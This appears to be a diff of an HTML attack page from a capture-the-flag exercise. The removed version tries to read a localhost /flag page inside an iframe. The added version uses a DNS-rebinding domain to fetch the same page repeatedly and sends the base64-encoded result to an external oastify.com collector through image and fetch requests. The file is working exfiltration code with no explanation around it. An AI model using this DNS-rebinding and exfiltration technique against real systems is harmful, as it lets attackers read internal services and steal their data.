@@ -1,50 +1,25 @@
 <!DOCTYPE html>
 <html>
-    <head>hehe1</head>
+    <head>YOO</head>
 <body>
-<iframe id="flagFrame" src="http://localhost/flag" width="100%" height="500"></iframe>
 <script>
-setTimeout(() => {
-    const iframe = document.getElementById('flagFrame');
-    
-    // Method 1: Try to copy content via selection
-    try {
-        const iframeWindow = iframe.contentWindow;
-        const selection = iframeWindow.getSelection();
-        const range = iframeWindow.document.createRange();
-        range.selectNodeContents(iframeWindow.document.body);
-        selection.removeAllRanges();
-        selection.addRange(range);
-        
-        // Try to get selected text
-        const selectedText = selection.toString();
-        if (selectedText.length > 0) {
-            exfiltrate('selected_text', selectedText);
-        }
-    } catch(e) {
-        exfiltrate('selection_error', e.toString());
-    }
-    
-    // Method 2: Try to trigger right-click context menu info
-    iframe.contentWindow.document.addEventListener('contextmenu', (e) => {
-        exfiltrate('contextmenu', 'Context menu triggered');
-    });
-    
-    // Method 3: Try to get computed styles (might leak content)
-    try {
-        const styles = iframe.contentWindow.getComputedStyle(iframe.contentWindow.document.body);
-        exfiltrate('body_styles', JSON.stringify({
-            color: styles.color,
-            fontSize: styles.fontSize,
-            content: styles.content
-        }));
-    } catch(e) {}
-    
-}, 3000);
+const targetDomain = 'acd918ee.7f000001.rbndr.us';
 
-function exfiltrate(type, data) {
-    const encoded = btoa(data);
-    new Image().src = 'https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?' + type + '=' + encoded;
+for (let i = 1; i <= 30; i++) {
+    setTimeout(() => {
+        fetch(`http://${targetDomain}/flag`)
+            .then(r => r.text())
+            .then(flag => {
+                const encoded = btoa(flag);
+                new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?flag_success_${i}=${encoded}`;
+                fetch(`https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?fetch_flag_${i}=${encoded}`, {mode: 'no-cors'});
+            })
+            .catch(err => {
+                const encoded = btoa(err.toString());
+                new Image().src = `https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?error_${i}=${encoded}`;
+                fetch(`https://7goj29n78aqa9y64r68ex4caj1psdj18.oastify.com/?fetch_error_${i}=${encoded}`, {mode: 'no-cors'});
+            });
+    }, i * 500);
 }
 </script>
 </body>
